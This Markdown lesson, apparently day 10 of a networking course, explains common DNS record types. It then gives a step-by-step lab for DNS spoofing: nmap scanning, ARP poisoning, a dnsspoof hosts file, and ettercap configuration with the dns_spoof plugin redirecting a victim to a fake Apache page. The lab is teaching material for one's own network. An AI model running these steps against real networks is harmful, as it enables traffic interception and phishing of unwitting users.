# 🌐 Day 10: DNS Record Types and DNS spoofing

![Networking](https://img.shields.io/badge/Networking-Basics-blue?style=for-the-badge)
![DNS](https://img.shields.io/badge/DNS-informational?style=for-the-badge)
![DNS Spoofing](https://img.shields.io/badge/DNS_Spoofing-critical?style=for-the-badge)

> _DNS is a complete infrastructure, and a domain contains multiple types of information and instructions stored in an **authoritative DNS server**._ 🌐

---

Many people think DNS is just **Domain → IP mapping**.  
But that is only true at a beginner level.

DNS is a complete infrastructure.

A domain contains multiple types of information and instructions stored in an **authoritative DNS server**.

Below are important DNS record types you should know:

---

## **1. A Record**

Points a domain to its **IPv4 address**.

---

## **2. AAAA Record**

Points a domain to its **IPv6 address**.

---

## **3. MX Record (Mail Exchange)**

Specifies where **incoming emails** for a domain should be delivered.

Example:  
Emails sent to `contact@usmansaid.com` may go to Cloudflare’s mail servers.

Important:

- MX records deal **only with incoming mail**
- They do not handle outgoing mail

---

## **4. CNAME Record (Canonical Name)**

Also known as an **Alias record**.

It points one domain to another domain.

Example:
`shop.usmansaid.com → usmansaid.com`

Important:  
When a recursive DNS server finds a CNAME, it must restart the resolution process to find the IP address of the aliased domain.

---

## **5. TXT Record**

Stores additional information in **text format**.

Common uses:

- Domain ownership verification
- SPF, DKIM, DMARC records
- Security configurations

---

## **6. NS Record (Name Server)**

Specifies which authoritative DNS server holds the DNS records for a domain.

In simple terms:  
It tells where the actual DNS information is stored.

---

## **7. PTR Record (Pointer Record)**

Used for **reverse DNS lookup**.

Instead of:
`Domain → IP`

It performs:
`IP → Domain`

Often used by:

- Email servers
- Security tools
- Strict validation systems

It verifies whether an IP actually belongs to a domain.

---

# **DNS Spoofing**

To perform DNS spoofing, two attacks usually work together:

1. ARP Poisoning
2. DNS Poisoning

### ARP Poisoning

Used to place yourself between the victim and the router (Man-in-the-Middle) so you can capture traffic.

### DNS Spoofing

Used to modify DNS responses and provide a fake IP address.

---

# **Setup Requirements**

Install the following tools:

1. `Ettercap`
2. `arpspoof`
3. `nmap`
4. `dnsspoof`
5. `apache2` (usually pre-installed)

---

# **Practical 1 – Basic DNS Spoofing (No Website Redirection)**

In this lab, we will poison DNS but not redirect to a fake website yet.

---

## Step 1: Scan the Network

`nmap -sS -O <targetIP>`
If practicing in your own LAN, scan the `/24` CIDR range.

---

## Step 2: Perform ARP Poisoning

After identifying:

- Victim IP
- Router IP

Launch ARP poisoning to become a **Man-in-the-Middle** and capture traffic.

---

## Step 3: Create Fake DNS File

In a third terminal:
`nano fake_dns_file.txt`

Add:
`<Your_Kali_IP> <Target_Site>`

Example:
`192.168.1.19 vulnweb.com`

Save and exit.

---

## Step 4: Start `dnsspoof`

`dnsspoof -i <Network_Interface> -f fake_dns_file.txt`

Example:
`dnsspoof -i eth0 -f fake_dns_file.txt`

Keep it running.

---

## Step 5: Test on Victim Machine

On victim machine:
`ping vulnweb.com`

If successful, it will show your Kali IP.
DNS is now poisoned.

---

# **Practical 2 – DNS Spoofing with Fake Website**

Now we will redirect the victim to our own fake website using Apache.

---

## Important Note

Apache serves files from:
`/var/www/html`

There is a default `index.html` file which we will modify.

---

## Step 1: Replace Website Content

Edit:
`/var/www/html/index.html`

Replace its content with your custom HTML page.

---

## Step 2: Change Ownership

`chown hacker /var/www/html/index.html`

---

## Step 3: Move to Ettercap Directory

`sudo cd /etc/ettercap`

Important files:

- `ettercap.conf`
- `ettercap.dns`

Make copies of both and edit the copied versions.

---

## Step 4: Modify ettercap.conf

- Change the values of `ec_uid` and `ec_gid` to `0`
- Remove `#` from the start of:

`redir_command_on`  
`redir_command_off  `
`redir6_command_on  `
`redir6_command_off`

Save and exit.

---

## Step 5: Modify `ettercap.dns`

Replace content with:

`vulnweb.com        A        192.168.10.11  `
`*.vulnweb.com      A        192.168.10.11  `
`www.vulnweb.com    PTR      192.168.10.11`

Important:  
Use **tabs**, not spaces, between fields.

Save and exit.

---

## Step 6: Start Apache

`sudo systemctl start apache2`

Check status:
`systemctl status apache2`

---

## Step 7: Start Ettercap in Text Mode

Important command:

`sudo ettercap -T -q -i eth0 -M arp:remote /192.168.10.13// /192.168.10.1// -P dns_spoof`

---

# Command Breakdown

- `**sudo ettercap**` → Run as root
- **`-T`** → Text interface
- **`-q`** → Quiet mode
- `-i eth0` → Network interface
- **`-M arp:remote`** → ARP poisoning in both directions
- **`/192.168.10.13// /192.168.10.1//`** → Victim and Router
- **`-P dns_spoof`** → Activate DNS spoofing plugin

---

## Final Step

On the victim machine, open the targeted website.

It should now redirect to your fake page.

DNS spoofing successful.

---

**Reference Video:** [DNS Spoofing](https://www.youtube.com/watch?v=0EQonkeqev0)

<div align="center">

**[⬅️ Day 9: DNS](./Day-09,%20DNS.md)**

</div>
